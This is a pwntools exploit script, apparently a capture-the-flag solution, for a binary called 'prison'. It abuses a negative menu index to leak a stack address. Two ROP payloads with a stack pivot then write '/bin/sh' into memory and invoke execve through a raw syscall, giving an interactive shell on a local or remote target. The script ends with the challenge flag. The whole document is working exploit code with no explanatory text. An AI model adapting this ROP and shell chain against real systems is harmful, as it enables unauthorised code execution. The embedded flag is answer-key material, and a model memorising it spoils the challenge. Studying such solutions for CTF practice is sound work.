#!/usr/bin/env python3
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
init-pwndbg
b*0x0000000000401B55
continue
"""

exe = "./prison"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

io = start()

sla(b'(1-6):', b'-1')
recvunt(b'is ')
stack_leak = u64(io.recv(6).ljust(8, b'\x00'))
log.info(hex(stack_leak))

pivot = 0x00000000004450f8 #: pop rsp ; ret
mov_qword = 0x000000000048927a # : mov qword ptr [rsi], rdx ; ret
pop_rsi = 0x0000000000413676 #: pop rsi ; pop rbp ; ret
pop_rdi = 0x0000000000401a0d #: pop rdi ; ret
pop_rdx = 0x0000000000401a1a #: pop rdx ; ret
pop_rax = 0x000000000041f464 #: pop rax ; ret
binsh = '/bin/sh\x00'
write_addr = 0x4cb310
syscall = 0x00000000004013b8
payload = flat(
    pop_rsi,
    write_addr,
    0x0,
    pop_rdx,
    binsh,
    mov_qword,
    elf.sym.prison,
    'A' * 16,
    pivot,
    stack_leak - 0x50 )

sla(b'name:', payload)
sla(b'(1-6):', b'1')

payload = flat(
    pop_rax,
    0x3b,
    pop_rdi,
    write_addr,
    pop_rsi,
    0x0,
    0x0,
    syscall,
    0x1,
    pivot,
    stack_leak - 0x60,
    0x2,
    'A' * 4,
    0x0,
    )
sla(b'name:', payload)
io.interactive()

#squ1rrel{m4n_0n_th3_rUn_fr0m_NX_pr1s0n!}
